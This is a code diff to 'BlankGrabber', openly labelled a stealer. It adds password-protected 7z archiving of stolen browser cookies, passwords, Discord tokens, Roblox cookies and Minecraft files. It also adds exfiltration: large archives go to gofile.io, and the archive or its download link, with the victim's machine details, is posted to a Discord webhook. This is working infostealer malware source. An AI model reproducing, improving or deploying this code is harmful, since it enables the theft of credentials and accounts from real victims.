@@ -750,7 +750,6 @@ class BlankGrabber:
         if Errors.errors:
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
-        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Compress collected data
         self.SendData()
         try:
             os.remove(self.ArchivePath)
@@ -1084,7 +1083,37 @@ class BlankGrabber:
                                     DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                     subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
+    def CreateArchive(self) -> str | None:
+        if Utility.GetSelf()[1]:
+            _7zPath = os.path.join(sys._MEIPASS, "7z.exe")
+            if os.path.isfile(_7zPath):
+                password = "blank"
+                process = subprocess.run('{} a -p{} "{}" *'.format(_7zPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
+                if process.returncode == 0:
+                    return password
+        
+        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder)
+    
+    def UploadToGofile(self, path, filename= None) -> str | None:
+        if os.path.isfile(path):
+            with open(path, "rb") as file:
+                fileBytes = file.read()
+
+            if filename is None:
+                filename = os.path.basename(path)
+            http = PoolManager()
+
+            try:
+                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
+                if server:
+                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["downloadPage"]
+                    if url:
+                        return url
+            except Exception:
+                pass
+
     def SendData(self) -> None:
+        password = self.CreateArchive()
         if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftFiles) and os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
@@ -1126,7 +1155,7 @@ class BlankGrabber:
             image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
 
             payload = {
-  "content": ("||@everyone||" if Settings.PingMe else "") + " New Victim",
+  "content": ("||@everyone||" if Settings.PingMe else "") + (" Archive Password: `{}`".format(password) if password else ""),
   "embeds": [
     {
       "title": "Blank Grabber",
@@ -1141,16 +1170,30 @@ class BlankGrabber:
       }
     }
   ],
-  "tts" : True,
   "username" : "Blank Grabber",
   "avatar_url" : image_url
 }
+
+            filename = "Blank-{}.zip".format(os.getlogin())
+
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 5:
+                url = self.UploadToGofile(self.ArchivePath, filename)
+            else:
+                url = None
             
-            with open(self.ArchivePath, "rb") as file:
-                fileBytes = file.read()
+            fields = dict()
 
-            http.request("POST", Settings.Webhook, fields= {"file" : ("Blank-{}.zip".format(os.getlogin()), fileBytes), "payload_json" : json.dumps(payload).encode()})
+            if not url:
+                with open(self.ArchivePath, "rb") as file:
+                    fileBytes = file.read()
 
+                fields["file"] = (filename, fileBytes)
+            else:
+                payload["content"] += " | Archive : {}".format(url)
+            
+            fields["payload_json"] = json.dumps(payload).encode()
+
+            http.request("POST", Settings.Webhook, fields= fields)
 
 if __name__ == "__main__" and os.name == "nt":
 
